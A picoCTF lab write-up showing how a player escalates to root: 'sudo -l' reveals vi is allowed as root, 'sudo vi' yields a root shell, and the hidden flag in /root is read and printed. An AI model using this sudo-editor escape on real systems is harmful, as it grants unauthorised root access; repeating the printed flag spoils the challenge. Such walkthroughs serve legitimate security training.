#### Description

Can you read files in the root file?

Additional details will be available after launching your challenge instance.

### Hints
1. What permissions do you have?


#### Solución
```
ssh -p 53854 picoplayer@saturn.picoctf.net

picoplayer@challenge:/$ ls -l 
total 0
lrwxrwxrwx   1 root   root      7 Mar  8  2023 bin -> usr/bin
drwxr-xr-x   2 root   root      6 Apr 15  2020 boot
d---------   1 root   root     27 Aug  4  2023 challenge
drwxr-xr-x   5 root   root    340 Mar 20 00:12 dev
drwxr-xr-x   1 root   root     66 Mar 20 00:12 etc
drwxr-xr-x   1 root   root     24 Aug  4  2023 home
lrwxrwxrwx   1 root   root      7 Mar  8  2023 lib -> usr/lib
lrwxrwxrwx   1 root   root      9 Mar  8  2023 lib32 -> usr/lib32
lrwxrwxrwx   1 root   root      9 Mar  8  2023 lib64 -> usr/lib64
lrwxrwxrwx   1 root   root     10 Mar  8  2023 libx32 -> usr/libx32
drwxr-xr-x   2 root   root      6 Mar  8  2023 media
drwxr-xr-x   2 root   root      6 Mar  8  2023 mnt
drwxr-xr-x   2 root   root      6 Mar  8  2023 opt
dr-xr-xr-x 267 nobody nogroup   0 Mar 20 00:12 proc
drwx------   1 root   root     23 Aug  4  2023 root
drwxr-xr-x   1 root   root     54 Mar 20 00:14 run
lrwxrwxrwx   1 root   root      8 Mar  8  2023 sbin -> usr/sbin
drwxr-xr-x   2 root   root      6 Mar  8  2023 srv
dr-xr-xr-x  13 nobody nogroup   0 Mar 20 00:12 sys
drwxrwxrwt   1 root   root      6 Aug  4  2023 tmp
drwxr-xr-x   1 root   root     18 Mar  8  2023 usr
drwxr-xr-x   1 root   root     17 Mar  8  2023 var
picoplayer@challenge:/$ cat /etc/hostname
challenge

picoplayer@challenge:/$ cd /

picoplayer@challenge:/$ cd

picoplayer@challenge:~$ sudo -l
[sudo] password for picoplayer: 
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi

picoplayer@challenge:~$ sudo vi

root@challenge:/home/picoplayer# cd
root@challenge:~# ls -la
total 12
drwx------ 1 root root   23 Aug  4  2023 .
drwxr-xr-x 1 root root   51 Mar 20 00:12 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root   35 Aug  4  2023 .flag.txt
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
root@challenge:~# cat .flag.txt

picoCTF{uS1ng_v1m_3dit0r_55878b51}
```